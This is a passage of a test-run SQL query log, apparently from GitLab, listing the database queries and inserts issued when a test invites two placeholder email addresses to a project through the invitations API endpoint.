\"plan_limits\".\"web_hook_calls\", \"plan_limits\".\"ci_daily_pipeline_schedule_triggers\", \"plan_limits\".\"ci_max_artifact_size_cluster_image_scanning\", \"plan_limits\".\"ci_jobs_trace_size_limit\", \"plan_limits\".\"pages_file_entries\", \"plan_limits\".\"dast_profile_schedules\", \"plan_limits\".\"external_audit_event_destinations\", \"plan_limits\".\"dotenv_variables\", \"plan_limits\".\"dotenv_size\", \"plan_limits\".\"pipeline_triggers\" FROM \"plan_limits\" WHERE \"plan_limits\".\"plan_id\" = 57 LIMIT 1 /*application:test,correlation_id:72c6c4e2-d753-44e3-bd5a-194599c9e951,endpoint_id:POST /api/:version/projects/:id/invitations,db_config_name:main*/\n       23: SELECT a.attname\n         FROM (\n                SELECT indrelid, indkey, generate_subscripts(indkey, 1) idx\n                  FROM pg_index\n                 WHERE indrelid = '\"plan_limits\"'::regclass\n                   AND indisprimary\n              ) i\n         JOIN pg_attribute a\n           ON a.attrelid = i.indrelid\n          AND a.attnum = i.indkey[i.idx]\n        ORDER BY i.idx\n\n       24: SELECT COUNT(*) FROM ((SELECT \"members\".* FROM \"members\" WHERE \"members\".\"source_type\" = 'Namespace' AND \"members\".\"source_id\" IN (SELECT \"namespaces\".\"id\" FROM \"namespaces\" WHERE \"namespaces\".\"type\" = 'User' AND (traversal_ids @\u003e ('{1006}'))))\n       UNION\n       (SELECT \"members\".* FROM \"members\" WHERE \"members\".\"source_type\" = 'Project' AND \"members\".\"source_id\" IN (SELECT \"projects\".\"id\" FROM \"projects\" WHERE \"projects\".\"namespace_id\" = 1006))) members WHERE \"members\".\"invite_token\" IS NOT NULL AND \"members\".\"created_at\" BETWEEN '2022-03-01 00:00:00' AND '2022-03-01 23:59:59.999999' /*application:test,correlation_id:72c6c4e2-d753-44e3-bd5a-194599c9e951,endpoint_id:POST /api/:version/projects/:id/invitations,db_config_name:main*/\n       25: SELECT \"users\".* FROM \"users\" WHERE \"users\".\"id\" IN (739, 740) /*application:test,correlation_id:72c6c4e2-d753-44e3-bd5a-194599c9e951,endpoint_id:POST /api/:version/projects/:id/invitations,db_config_name:main*/\n       26: SELECT \"members\".* FROM \"members\" WHERE \"members\".\"type\" = 'ProjectMember' AND \"members\".\"source_id\" = 99 AND \"members\".\"source_type\" = 'Project' AND \"members\".\"user_id\" IN (739, 740) /*application:test,correlation_id:72c6c4e2-d753-44e3-bd5a-194599c9e951,endpoint_id:POST /api/:version/projects/:id/invitations,db_config_name:main*/\n       27: SAVEPOINT active_record_2 /*application:test,correlation_id:72c6c4e2-d753-44e3-bd5a-194599c9e951,endpoint_id:POST /api/:version/projects/:id/invitations,db_config_name:main*/\n       28: SELECT \"users\".* FROM ((SELECT \"users\".* FROM \"users\" WHERE (LOWER(\"users\".\"email\") IN (LOWER('email1@example.com'))))\n       UNION\n       (SELECT \"users\".* FROM \"users\" INNER JOIN \"emails\" ON \"emails\".\"user_id\" = \"users\".\"id\" WHERE \"emails\".\"email\" = 'email1@example.com')) users LIMIT 1 /*application:test,correlation_id:72c6c4e2-d753-44e3-bd5a-194599c9e951,endpoint_id:POST /api/:version/projects/:id/invitations,db_config_name:main*/\n       29: SELECT \"projects\".\"id\", \"projects\".\"name\", \"projects\".\"path\", \"projects\".\"description\", \"projects\".\"created_at\", \"projects\".\"updated_at\", \"projects\".\"creator_id\", \"projects\".\"namespace_id\", \"projects\".\"last_activity_at\", \"projects\".\"import_url\", \"projects\".\"visibility_level\", \"projects\".\"archived\", \"projects\".\"avatar\", \"projects\".\"merge_requests_template\", \"projects\".\"star_count\", \"projects\".\"merge_requests_rebase_enabled\", \"projects\".\"import_type\", \"projects\".\"import_source\", \"projects\".\"approvals_before_merge\", \"projects\".\"reset_approvals_on_push\", \"projects\".\"merge_requests_ff_only_enabled\", \"projects\".\"issues_template\", \"projects\".\"mirror\", \"projects\".\"mirror_user_id\", \"projects\".\"shared_runners_enabled\", \"projects\".\"runners_token\", \"projects\".\"build_coverage_regex\", \"projects\".\"build_allow_git_fetch\", \"projects\".\"build_timeout\", \"projects\".\"mirror_trigger_builds\", \"projects\".\"pending_delete\", \"projects\".\"public_builds\", \"projects\".\"last_repository_check_failed\", \"projects\".\"last_repository_check_at\", \"projects\".\"only_allow_merge_if_pipeline_succeeds\", \"projects\".\"has_external_issue_tracker\", \"projects\".\"repository_storage\", \"projects\".\"repository_read_only\", \"projects\".\"request_access_enabled\", \"projects\".\"has_external_wiki\", \"projects\".\"ci_config_path\", \"projects\".\"lfs_enabled\", \"projects\".\"description_html\", \"projects\".\"only_allow_merge_if_all_discussions_are_resolved\", \"projects\".\"repository_size_limit\", \"projects\".\"printing_merge_request_link_enabled\", \"projects\".\"auto_cancel_pending_pipelines\", \"projects\".\"service_desk_enabled\", \"projects\".\"cached_markdown_version\", \"projects\".\"delete_error\", \"projects\".\"last_repository_updated_at\", \"projects\".\"disable_overriding_approvers_per_merge_request\", \"projects\".\"storage_version\", \"projects\".\"resolve_outdated_diff_discussions\", \"projects\".\"remote_mirror_available_overridden\", \"projects\".\"only_mirror_protected_branches\", \"projects\".\"pull_mirror_available_overridden\", \"projects\".\"jobs_cache_index\", \"projects\".\"external_authorization_classification_label\", \"projects\".\"mirror_overwrites_diverged_branches\", \"projects\".\"pages_https_only\", \"projects\".\"external_webhook_token\", \"projects\".\"packages_enabled\", \"projects\".\"merge_requests_author_approval\", \"projects\".\"pool_repository_id\", \"projects\".\"runners_token_encrypted\", \"projects\".\"bfg_object_map\", \"projects\".\"detected_repository_languages\", \"projects\".\"merge_requests_disable_committers_approval\", \"projects\".\"require_password_to_approve\", \"projects\".\"emails_disabled\", \"projects\".\"max_pages_size\", \"projects\".\"max_artifacts_size\", \"projects\".\"remove_source_branch_after_merge\", \"projects\".\"marked_for_deletion_at\", \"projects\".\"marked_for_deletion_by_user_id\", \"projects\".\"autoclose_referenced_issues\", \"projects\".\"suggestion_commit_message\", \"projects\".\"project_namespace_id\", \"projects\".\"hidden\" FROM \"projects\" WHERE \"projects\".\"id\" = 99 LIMIT 1 /*application:test,correlation_id:72c6c4e2-d753-44e3-bd5a-194599c9e951,endpoint_id:POST /api/:version/projects/:id/invitations,db_config_name:main*/\n       30: SELECT \"namespaces\".\"id\", \"namespaces\".\"name\", \"namespaces\".\"path\", \"namespaces\".\"owner_id\", \"namespaces\".\"created_at\", \"namespaces\".\"updated_at\", \"namespaces\".\"type\", \"namespaces\".\"description\", \"namespaces\".\"avatar\", \"namespaces\".\"membership_lock\", \"namespaces\".\"share_with_group_lock\", \"namespaces\".\"visibility_level\", \"namespaces\".\"request_access_enabled\", \"namespaces\".\"ldap_sync_status\", \"namespaces\".\"ldap_sync_error\", \"namespaces\".\"ldap_sync_last_update_at\", \"namespaces\".\"ldap_sync_last_successful_update_at\", \"namespaces\".\"ldap_sync_last_sync_at\", \"namespaces\".\"description_html\", \"namespaces\".\"lfs_enabled\", \"namespaces\".\"parent_id\", \"namespaces\".\"shared_runners_minutes_limit\", \"namespaces\".\"repository_size_limit\", \"namespaces\".\"require_two_factor_authentication\", \"namespaces\".\"two_factor_grace_period\", \"namespaces\".\"cached_markdown_version\", \"namespaces\".\"project_creation_level\", \"namespaces\".\"runners_token\", \"namespaces\".\"file_template_project_id\", \"namespaces\".\"saml_discovery_token\", \"namespaces\".\"runners_token_encrypted\", \"namespaces\".\"custom_project_templates_group_id\", \"namespaces\".\"auto_devops_enabled\", \"namespaces\".\"extra_shared_runners_minutes_limit\", \"namespaces\".\"last_ci_minutes_notification_at\", \"namespaces\".\"last_ci_minutes_usage_notification_level\", \"namespaces\".\"subgroup_creation_level\", \"namespaces\".\"emails_disabled\", \"namespaces\".\"max_pages_size\", \"namespaces\".\"max_artifacts_size\", \"namespaces\".\"mentions_disabled\", \"namespaces\".\"default_branch_protection\", \"namespaces\".\"unlock_membership_to_ldap\", \"namespaces\".\"max_personal_access_token_lifetime\", \"namespaces\".\"push_rule_id\", \"namespaces\".\"shared_runners_enabled\", \"namespaces\".\"allow_descendants_override_disabled_shared_runners\", \"namespaces\".\"traversal_ids\" FROM \"namespaces\" WHERE \"namespaces\".\"type\" = 'Group' AND \"namespaces\".\"id\" = 1006 LIMIT 1 /*application:test,correlation_id:72c6c4e2-d753-44e3-bd5a-194599c9e951,endpoint_id:POST /api/:version/projects/:id/invitations,db_config_name:main*/\n       31: SELECT \"namespaces\".\"id\", \"namespaces\".\"name\", \"namespaces\".\"path\", \"namespaces\".\"owner_id\", \"namespaces\".\"created_at\", \"namespaces\".\"updated_at\", \"namespaces\".\"type\", \"namespaces\".\"description\", \"namespaces\".\"avatar\", \"namespaces\".\"membership_lock\", \"namespaces\".\"share_with_group_lock\", \"namespaces\".\"visibility_level\", \"namespaces\".\"request_access_enabled\", \"namespaces\".\"ldap_sync_status\", \"namespaces\".\"ldap_sync_error\", \"namespaces\".\"ldap_sync_last_update_at\", \"namespaces\".\"ldap_sync_last_successful_update_at\", \"namespaces\".\"ldap_sync_last_sync_at\", \"namespaces\".\"description_html\", \"namespaces\".\"lfs_enabled\", \"namespaces\".\"parent_id\", \"namespaces\".\"shared_runners_minutes_limit\", \"namespaces\".\"repository_size_limit\", \"namespaces\".\"require_two_factor_authentication\", \"namespaces\".\"two_factor_grace_period\", \"namespaces\".\"cached_markdown_version\", \"namespaces\".\"project_creation_level\", \"namespaces\".\"runners_token\", \"namespaces\".\"file_template_project_id\", \"namespaces\".\"saml_discovery_token\", \"namespaces\".\"runners_token_encrypted\", \"namespaces\".\"custom_project_templates_group_id\", \"namespaces\".\"auto_devops_enabled\", \"namespaces\".\"extra_shared_runners_minutes_limit\", \"namespaces\".\"last_ci_minutes_notification_at\", \"namespaces\".\"last_ci_minutes_usage_notification_level\", \"namespaces\".\"subgroup_creation_level\", \"namespaces\".\"emails_disabled\", \"namespaces\".\"max_pages_size\", \"namespaces\".\"max_artifacts_size\", \"namespaces\".\"mentions_disabled\", \"namespaces\".\"default_branch_protection\", \"namespaces\".\"unlock_membership_to_ldap\", \"namespaces\".\"max_personal_access_token_lifetime\", \"namespaces\".\"push_rule_id\", \"namespaces\".\"shared_runners_enabled\", \"namespaces\".\"allow_descendants_override_disabled_shared_runners\", \"namespaces\".\"traversal_ids\" FROM \"namespaces\" WHERE \"namespaces\".\"id\" = 1006 LIMIT 1 /*application:test,correlation_id:72c6c4e2-d753-44e3-bd5a-194599c9e951,endpoint_id:POST /api/:version/projects/:id/invitations,db_config_name:main*/\n       32: SELECT \"users\".* FROM \"users\" WHERE \"users\".\"id\" = 736 LIMIT 1 /*application:test,correlation_id:72c6c4e2-d753-44e3-bd5a-194599c9e951,endpoint_id:POST /api/:version/projects/:id/invitations,db_config_name:main*/\n       33: SELECT \"members\".* FROM \"members\" WHERE \"members\".\"type\" = 'ProjectMember' AND \"members\".\"source_type\" = 'Project' AND \"members\".\"invite_token\" = '1a421d162e7eb75614f8b110e99d3ce0efb70f424cdd2d8a5509bf93c9de3fc7' ORDER BY \"members\".\"id\" ASC LIMIT 1 /*application:test,correlation_id:72c6c4e2-d753-44e3-bd5a-194599c9e951,endpoint_id:POST /api/:version/projects/:id/invitations,db_config_name:main*/\n       34: SELECT 1 AS one FROM \"members\" WHERE \"members\".\"invite_email\" = 'email1@example.com' AND \"members\".\"source_type\" = 'Project' AND \"members\".\"source_id\" = 99 LIMIT 1 /*application:test,correlation_id:72c6c4e2-d753-44e3-bd5a-194599c9e951,endpoint_id:POST /api/:version/projects/:id/invitations,db_config_name:main*/\n       35: INSERT INTO \"members\" (\"access_level\", \"source_id\", \"source_type\", \"type\", \"created_at\", \"updated_at\", \"created_by_id\", \"invite_email\", \"invite_token\", \"member_namespace_id\", \"notification_level\") VALUES (30, 99, 'Project', 'ProjectMember', '2022-03-01 16:06:45.370765', '2022-03-01 16:06:45.370765', 736, 'email1@example.com', '1a421d162e7eb75614f8b110e99d3ce0efb70f424cdd2d8a5509bf93c9de3fc7', 1010, 3) RETURNING \"id\" /*application:test,correlation_id:72c6c4e2-d753-44e3-bd5a-194599c9e951,endpoint_id:POST /api/:version/projects/:id/invitations,db_config_name:main*/\n       36: SELECT \"users\".* FROM ((SELECT \"users\".* FROM \"users\" WHERE (LOWER(\"users\".\"email\") IN (LOWER('email2@example.com'))))\n       UNION\n       (SELECT \"users\".* FROM \"users\" INNER JOIN \"emails\" ON \"emails\".\"user_id\" = \"users\".\"id\" WHERE \"emails\".\"email\" = 'email2@example.com')) users LIMIT 1 /*application:test,correlation_id:72c6c4e2-d753-44e3-bd5a-194599c9e951,endpoint_id:POST /api/:version/projects/:id/invitations,db_config_name:main*/\n       37: SELECT \"projects\".\"id\", \"projects\".\"name\", \"projects\".\"path\", \"projects\".\"description\", \"projects\".\"created_at\", \"projects\".\"updated_at\", \"projects\".\"creator_id\", \"projects\".\"namespace_id\", \"projects\".\"last_activity_at\", \"projects\".\"import_url\", \"projects\".\"visibility_level\", \"projects\".\"archived\", \"projects\".\"avatar\", \"projects\".\"merge_requests_template\", \"projects\".\"star_count\", \"projects\".\"merge_requests_rebase_enabled\", \"projects\".\"import_type\", \"projects\".\"import_source\", \"projects\".\"approvals_before_merge\", \"projects\".\"reset_approvals_on_push\", \"projects\".\"merge_requests_ff_only_enabled\", \"projects\".\"issues_template\", \"projects\".\"mirror\", \"projects\".\"mirror_user_id\", \"projects\".\"shared_runners_enabled\", \"projects\".\"runners_token\", \"projects\".\"build_coverage_regex\", \"projects\".\"build_allow_git_fetch\", \"projects\".\"build_timeout\", \"projects\".\"mirror_trigger_builds\", \"projects\".\"pending_delete\", \"projects\".\"public_builds\", \"projects\".\"last_repository_check_failed\", \"projects\".\"last_repository_check_at\", \"projects\".\"only_allow_merge_if_pipeline_succeeds\", \"projects\".\"has_external_issue_tracker\", \"projects\".\"repository_storage\", \"projects\".\"repository_read_only\", \"projects\".\"request_access_enabled\", \"projects\".\"has_external_wiki\", \"projects\".\"ci_config_path\", \"projects\".\"lfs_enabled\", \"projects\".\"description_html\", \"projects\".\"only_allow_merge_if_all_discussions_are_resolved\", \"projects\".\"repository_size_limit\", \"projects\".\"printing_merge_request_link_enabled\", \"projects\".\"auto_cancel_pending_pipelines\", \"projects\".\"service_desk_enabled\", \"projects\".\"cached_markdown_version\", \"projects\".\"delete_error\", \"projects\".\"last_repository_updated_at\", \"projects\".\"disable_overriding_approvers_per_merge_request\", \"projects\".\"storage_version\", \"projects\".\"resolve_outdated_diff_discussions\", \"projects\".\"remote_mirror_available_overridden\", \"projects\".\"only_mirror_protected_branches\", \"projects\".\"pull_mirror_available_overridden\", \"projects\".\"jobs_cache_index\", \"projects\".\"external_authorization_classification_label\", \"projects\".\"mirror_overwrites_diverged_branches\", \"projects\".\"pages_https_only\", \"projects\".\"external_webhook_token\", \"projects\".\"packages_enabled\", \"projects\".\"merge_requests_author_approval\", \"projects\".\"pool_repository_id\", \"projects\".\"runners_token_encrypted\", \"projects\".\"bfg_object_map\", \"projects\".\"detected_repository_languages\", \"projects\".\"merge_requests_disable_committers_approval\", \"projects\".\"require_password_to_approve\", \"projects\".\"emails_disabled\", \"projects\".\"max_pages_size\", \"projects\".\"max_artifacts_size\", \"projects\".\"remove_source_branch_after_merge\", \"projects\".\"marked_for_deletion_at\", \"projects\".\"marked_for_deletion_by_user_id\", \"projects\".\"autoclose_referenced_issues\", \"projects\".\"suggestion_commit_message\", \"projects\".\"project_namespace_id\", \"projects\".\"hidden\" FROM \"projects\" WHERE \"projects\".\"id\" = 99 LIMIT 1 /*application:test,correlation_id:72c6c4e2-d753-44e3-bd5a-194599c9e951,endpoint_id:POST /api/:version/projects/:id/invitations,db_config_name:main*/\n       38: SELECT \"namespaces\".\"id\", \"namespaces\".\"name\", \"namespaces\".\"path\", \"namespaces\".\"owner_id\", \"namespaces\".\"created_at\", \"namespaces\".\"updated_at\", \"namespaces\".\"type\", \"namespaces\".\"description\", \"namespaces\".\"avatar\", \"namespaces\".\"membership_lock\", \"namespaces\".\"share_with_group_lock\", \"namespaces\".\"visibility_level\", \"namespaces\".\"request_access_enabled\", \"namespaces\".\"ldap_sync_status\", \"namespaces\".\"ldap_sync_error\", \"namespaces\".\"ldap_sync_last_update_at\", \"namespaces\".\"ldap_sync_last_successful_update_at\", \"namespaces\".\"ldap_sync_last_sync_at\", \"namespaces\".\"description_html\", \"namespaces\".\"lfs_enabled\", \"namespaces\".\"parent_id\", \"namespaces\".\"shared_runners_minutes_limit\", \"namespaces\".\"repository_size_limit\", \"namespaces\".\"require_two_factor_authentication\", \"namespaces\".\"two_factor_grace_period\", \"namespaces\".\"cached_markdown_version\", \"namespaces\".\"project_creation_level\", \"namespaces\".\"runners_token\", \"namespaces\".\"file_template_project_id\", \"namespaces\".\"saml_discovery_token\", \"namespaces\".\"runners_token_encrypted\", \"namespaces\".\"custom_project_templates_group_id\", \"namespaces\".\"auto_devops_enabled\", \"namespaces\".\"extra_shared_runners_minutes_limit\", \"namespaces\".\"last_ci_minutes_notification_at\", \"namespaces\".\"last_ci_minutes_usage_notification_level\", \"namespaces\".\"subgroup_creation_level\", \"namespaces\".\"emails_disabled\", \"namespaces\".\"max_pages_size\", \"namespaces\".\"max_artifacts_size\", \"namespaces\".\"mentions_disabled\", \"namespaces\".\"default_branch_protection\", \"namespaces\".\"unlock_membership_to_ldap\", \"namespaces\".\"max_personal_access_token_lifetime\", \"namespaces\".\"push_rule_id\", \"namespaces\".\"shared_runners_enabled\", \"namespaces\".\"allow_descendants_override_disabled_shared_runners\", \"namespaces\".\"traversal_ids\" FROM \"namespaces\" WHERE \"namespaces\".\"type\" = 'Group' AND \"namespaces\".\"id\" = 1006 LIMIT 1 /*application:test,correlation_id:72c6c4e2-d753-44e3-bd5a-194599c9e951,endpoint_id:POST /api/:version/projects/:id/invitations,db_config_name:main*/\n       39: SELECT \"namespaces\".\"id\", \"namespaces\".\"name\", \"namespaces\".\"path\", \"namespaces\".\"owner_id\", \"namespaces\".\"created_at\", \"namespaces\".\"updated_at\", \"namespaces\".\"type\", \"namespaces\".\"description\", \"namespaces\".\"avatar\", \"namespaces\".\"membership_lock\", \"namespaces\".\"share_with_group_lock\", \"namespaces\".\"visibility_level\", \"namespaces\".\"request_access_enabled\", \"namespaces\".\"ldap_sync_status\", \"namespaces\".\"ldap_sync_error\", \"namespaces\".\"ldap_sync_last_update_at\", \"namespaces\".\"ldap_sync_last_successful_update_at\", \"namespaces\".\"ldap_sync_last_sync_at\", \"namespaces\".\"description_html\", \"namespaces\".\"lfs_enabled\", \"namespaces\".\"parent_id\", \"namespaces\".\"shared_runners_minutes_limit\", \"namespaces\".\"repository_size_limit\", \"namespaces\".\"require_two_factor_authentication\", \"namespaces\".\"two_factor_grace_period\", \"namespaces\".\"cached_markdown_version\", \"namespaces\".\"project_creation_level\", \"namespaces\".\"runners_token\", \"namespaces\".\"file_template_project_id\", \"namespaces\".\"saml_discovery_token\", \"namespaces\".\"runners_token_encrypted\", \"namespaces\".\"custom_project_templates_group_id\", \"namespaces\".\"auto_devops_enabled\", \"namespaces\".\"extra_shared_runners_minutes_limit\", \"namespaces\".\"last_ci_minutes_notification_at\", \"namespaces\".\"last_ci_minutes_usage_notification_level\", \"namespaces\".\"subgroup_creation_level\", \"namespaces\".\"emails_disabled\", \"namespaces\".\"max_pages_size\", \"namespaces\".\"max_artifacts_size\", \"namespaces\".\"mentions_disabled\", \"namespaces\".\"default_branch_protection\", \"namespaces\".\"unlock_membership_to_ldap\", \"namespaces\".\"max_personal_access_token_lifetime\", \"namespaces\".\"push_rule_id\", \"namespaces\".\"shared_runners_enabled\", \"namespaces\".\"allow_descendants_override_disabled_shared_runners\", \"namespaces\".\"traversal_ids\" FROM \"namespaces\" WHERE \"namespaces\".\"id\" = 1006 LIMIT 1 /*application:test,correlation_id:72c6c4e2-d753-44e3-bd5a-194599c9e951,endpoint_id:POST /api/:version/projects/:id/invitations,db_config_name:main*/\n       40: SELECT \"users\".* FROM \"users\" WHERE \"users\".\"id\" = 736 LIMIT 1 /*application:test,correlation_id:72c6c4e2-d753-44e3-bd5a-194599c9e951,endpoint_id:POST /api/:version/projects/:id/invitations,db_config_name:main*/\n       41: SELECT \"members\".* FROM \"members\" WHERE \"members\".\"type\" = 'ProjectMember' AND \"members\".\"source_type\" = 'Project' AND \"members\".\"invite_token\" = '99fbbae19d794490ea8010c3b7787342e8c0ff990a12a8b8a6c08a2ce0703e65' ORDER BY \"members\".\"id\" ASC LIMIT 1 /*application:test,correlation_id:72c6c4e2-d753-44e3-bd5a-194599c9e951,endpoint_id:POST /api/:version/projects/:id/invitations,db_config_name:main*/\n       42: SELECT 1 AS one FROM \"members\" WHERE \"members\".\"invite_email\" = 'email2@example.com' AND \"members\".\"source_type\" = 'Project' AND \"members\".\"source_id\" = 99 LIMIT 1 /*application:test,correlation_id:72c6c4e2-d753-44e3-bd5a-194599c9e951,endpoint_id:POST /api/:version/projects/:id/invitations,db_config_name:main*/\n       43: INSERT INTO \"members\" (\"access_level\", \"source_id\", \"source_type\", \"type\", \"created_at\", \"updated_at\", \"created_by_id\", \"invite_email\", \"invite_token\", \"member_namespace_id\", \"notification_level\") VALUES (30, 99, 'Project', 'ProjectMember', '2022-03-01 16:06:45.408754', '2022-03-01 16:06:45.408754', 736, 'email2@example.com', '99fbbae19d794490ea8010c3b7787342e8c0ff990a12a8b8a6c08a2ce0703e65', 1010, 3) RETURNING \"id\" /*application:test,correlation_id:72c6c4e2-d753-44e3-bd5a-194599c9e951,endpoint_id:POST /api/:version/projects/:id/invitations,db_config_name:main*/\n       44: SELECT \"projects\".\"id\", \"projects\".\"name\", \"projects\".\"path\", \"projects\".\"description\", \"projects\".\"created_at\", \"projects\".\"updated_at\", \"projects\".\"creator_id\", \"projects\".\"namespace_id\", \"projects\".\"last_activity_at\", \"projects\".\"import_url\", \"projects\".\"visibility_level\", \"projects\".\"archived\", \"projects\".\"avatar\", \"projects\".\"merge_requests_template\", \"projects\".\"star_count\", \"projects\".\"merge_requests_rebase_enabled\", \"projects\".\"import_type\", \"projects\".\"import_source\", \"projects\".\"approvals_before_merge\", \"projects\".\"reset_approvals_on_push\", \"projects\".\"merge_requests_ff_only_enabled\", \"projects\".\"issues_template\", \"projects\".\"mirror\", \"projects\".\"mirror_user_id\", \"projects\".\"shared_runners_enabled\", \"projects\".\"runners_token\", \"projects\".\"build_coverage_regex\", \"projects\".\"build_allow_git_fetch\", \"projects\".\"build_timeout\", \"projects\".\"mirror_trigger_builds\", \"projects\".\"pending_delete\", \"projects\".\"public_builds\", \"projects\".\"last_repository_check_failed\", \"projects\".\"last_repository_check_at\", \"projects\".\"only_allow_merge_if_pipeline_succeeds\", \"projects\".\"has_external_issue_tracker\", \"projects\".\"repository_storage\", \"projects\".\"repository_read_only\", \"projects\".\"request_access_enabled\", \"projects\".\"has_external_wiki\", \"projects\".\"ci_config_path\", \"projects\".\"lfs_enabled\", \"projects\".\"description_html\", \"projects\".\"only_allow_merge_if_all_discussions_are_resolved\", \"projects\".\"repository_size_limit\", \"projects\".\"printing_merge_request_link_enabled\", \"projects\".\"auto_cancel_pending_pipelines\", \"projects\".\"service_desk_enabled\", \"projects\".\"cached_markdown_version\", \"projects\".\"delete_error\", \"projects\".\"last_repository_updated_at\", \"projects\".\"disable_overriding_approvers_per_merge_request\", \"projects\".\"storage_version\", \"projects\".\"resolve_outdated_diff_discussions\", \"projects\".\"remote_mirror_available_overridden\", \"projects\".\"only_mirror_protected_branches\", \"projects\".\"pull_mirror_available_overridden\", \"projects\".\"jobs_cache_index\", \"projects\".\"external_authorization_classification_label\", \"projects\".\"mirror_overwrites_diverged_branches\", \"projects\".\"pages_https_only\", \"projects\".\"external_webhook_token\", \"projects\".\"packages_enabled\", \"projects\".\"merge_requests_author_approval\", \"projects\".\"pool_repository_id\", \"projects\".\"runners_token_encrypted\", \"projects\".\"bfg_object_map\", \"projects\".\"detected_repository_languages\", \"projects\".\"merge_requests_disable_committers_approval\", \"projects\".\"require_password_to_approve\", \"projects\".\"emails_disabled\", \"projects\".\"max_pages_size\", \"projects\".\"max_artifacts_size\", \"projects\".\"remove_source_branch_after_merge\", \"projects\".\"marked_for_deletion_at\", \"projects\".\"marked_for_deletion_by_user_id\", \"projects\".\"autoclose_referenced_issues\", \"projects\".\"suggestion_commit_message\", \"projects\".\"project_namespace_id\", \"projects\".\"hidden\" FROM \"projects\" WHERE \"projects\".\"id\" = 99 LIMIT 1 /*application:test,correlation_id:72c6c4e2-d753-44e3-bd5a-194599c9e951,endpoint_id:POST /api/:version/projects/:id/invitations,db_config_name:main*/\n       45: SELECT \"users\".* FROM \"users\" WHERE \"users\".\"id\" = 739 LIMIT 1 /*application:test,correlation_id:72c6c4e2-d753-44e3-bd5a-194599c9e951,endpoint_id:POST /api/:version/projects/:id/invitations,db_config_name:main*/\n       46: SELECT \"namespaces\".\"id\", \"namespaces\".\"name\", \"namespaces\".\"path\", \"namespaces\".\"owner_id\", \"namespaces\".\"created_at\", \"namespaces\".\"updated_at\", \"namespaces\".\"type\", \"namespaces\".\"description\", \"namespaces\".\"avatar\", \"namespaces\".\"membership_lock\", \"namespaces\".\"share_with_group_lock\", \"namespaces\".\"visibility_level\", \"namespaces\".\"request_access_enabled\", \"namespaces\".\"ldap_sync_status\", \"namespaces\".\"ldap_sync_error\", \"namespaces\".\"ldap_sync_last_update_at\", \"namespaces\".\"ldap_sync_last_successful_update_at\", \"namespaces\".\"ldap_sync_last_sync_at\", \"namespaces\".\"description_html\", \"namespaces\".\"lfs_enabled\", \"namespaces\".\"parent_id\", \"namespaces\".\"shared_runners_minutes_limit\", \"namespaces\".\"repository_size_limit\", \"namespaces\".\"require_two_factor_authentication\", \"namespaces\".\"two_factor_grace_period\", \"namespaces\".\"cached_markdown_version\", \"namespaces\".\"project_creation_level\", \"namespaces\".\"runners_token\", \"namespaces\".\"file_template_project_id\", \"namespaces\".\"saml_discovery_token\", \"namespaces\".\"runners_token_encrypted\", \"namespaces\".\"custom_project_templates_group_id\", \"namespaces\".\"auto_devops_enabled\", \"namespaces\".\"extra_shared_runners_minutes_limit\", \"namespaces\".\"last_ci_minutes_notification_at\", \"namespaces\".\"last_ci_minutes_usage_notification_level\", \"namespaces\".\"subgroup_creation_level\", \"namespaces\".\"emails_disabled\", \"namespaces\".\"max_pages_size\", \"namespaces\".\"max_artifacts_size\", \"namespaces\".\"mentions_disabled\", \"namespaces\".\"default_branch_protection\", \"namespaces\".\"unlock_membership_to_ldap\", \"namespaces\".\"max_personal_access_token_lifetime\", \"namespaces\".\"push_rule_id\", \"namespaces\".\"shared_runners_enabled\", \"namespaces\".\"allow_descendants_override_disabled_shared_runners\", \"namespaces\".\"traversal_ids\" FROM \"namespaces\" WHERE \"namespaces\".\"type\" = 'Group' AND \"namespaces\".\"id\" = 1006 LIMIT 1 /*application:test,correlation_id:72c6c4e2-d753-44e3-bd5a-194599c9e951,endpoint_id:POST /api/:version/projects/:id/invitations,db_config_name:main*/\n       47: SELECT \"namespaces\".\"id\", \"namespaces\".\"name\", \"namespaces\".\"path\", \"namespaces\".\"owner_id\", \"namespaces\".\"created_at\", \"namespaces\".\"updated_at\", \"namespaces\".\"type\", \"namespaces\".\"description\", \"namespaces\".\"avatar\", \"namespaces\".\"membership_lock\", \"namespaces\".\"share_with_group_lock\", \"namespaces\".\"visibility_level\", \"namespaces\".\"request_access_enabled\", \"namespaces\".\"ldap_sync_status\", \"namespaces\".\"ldap_sync_error\", \"namespaces\".\"ldap_sync_last_update_at\", \"namespaces\".\"ldap_sync_last_successful_update_at\", \"namespaces\".\"ldap_sync_last_sync_at\", \"namespaces\".\"description_html\", \"namespaces\".\"lfs_enabled\", \"namespaces\".\"parent_id\", \"namespaces\".\"shared_runners_minutes_limit\", \"namespaces\".\"repository_size_limit\", \"namespaces\".\"require_two_factor_authentication\", \"namespaces\".\"two_factor_grace_period\", \"namespaces\".\"cached_markdown_version\", \"namespaces\".\"project_creation_level\", \"namespaces\".\"runners_token\", \"namespaces\".\"file_template_project_id\", \"namespaces\".\"saml_discovery_token\", \"namespaces\".\"runners_token_encrypted\", \"namespaces\".\"custom_project_templates_group_id\", \"namespaces\".\"auto_devops_enabled\", \"namespaces\".\"extra_shared_runners_minutes_limit\", \"namespaces\".\"last_ci_minutes_notification_at\", \"namespaces\".\"last_ci_minutes_usage_notification_level\", \"namespaces\".\"subgroup_creation_level\", \"namespaces\".\"emails_disabled\", \"namespaces\".\"max_pages_size\", \"namespaces\".\"max_artifacts_size\", \"namespaces\".\"mentions_disabled\", \"namespaces\".\"default_branch_protection\", \"namespaces\".\"unlock_membership_to_ldap\", \"namespaces\".\"max_personal_access_token_lifetime\", \"namespaces\".\"push_rule_id\", \"namespaces\".\"shared_runners_enabled\", \"namespaces\".\"allow_descendants_override_disabled_shared_runners\", \"namespaces\".\"traversal_ids\" FROM \"namespaces\" WHERE \"namespaces\".\"id\" = 1006 LIMIT 1 /*application:test,correlation_id:72c6c4e2-d753-44e3-bd5a-194599c9e951,endpoint_id:POST /api/:version/projects/:id/invitations,db_config_name:main*/\n       48: SELECT \"users\".* FROM \"users\" WHERE \"users\".\"id\" = 736 LIMIT 1 /*application:test,correlation_id:72c6c4e2-d753-44e3-bd5a-194599c9e951,endpoint_id:POST /api/:version/projects/:id/invitations,db_config_name:main*/\n       49: SELECT 1 AS one FROM \"members\" WHERE \"members\".\"user_id\" = 739 AND \"members\".\"source_type\" = 'Project' AND \"members\".\"source_id\" = 99 LIMIT 1 /*application:test,correlation_id:72c6c4e2-d753-44e3-bd5a-194599c9e951,endpoint_id:POST /api/:version/projects/:id/invitations,db_config_name:main*/\n       50: INSERT INTO \"members\" (\"access_level\", \"source_id\", \"source_type\", \"user_id\", \"type\", 